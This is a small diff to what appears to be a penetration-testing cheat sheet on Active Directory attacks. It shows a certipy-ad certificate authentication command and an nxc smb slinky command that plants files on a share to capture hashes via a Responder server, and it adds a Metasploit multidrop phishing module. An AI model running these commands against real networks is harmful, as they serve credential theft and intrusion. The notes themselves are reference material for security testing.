@@ -236,6 +236,11 @@ certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip 10.1.107.118
 nxc smb $target -u 'username' -p 'passwords'  -M slinky -o SHARE=Share  NAME=phish SERVER=$server_in_responder 
 ```
 
+Phish by `msfconsole` 
+```bash
+use auxiliary/fileformat/multidrop 
+```
+
 [[Bloodhound]]
 == Bloodhound
 
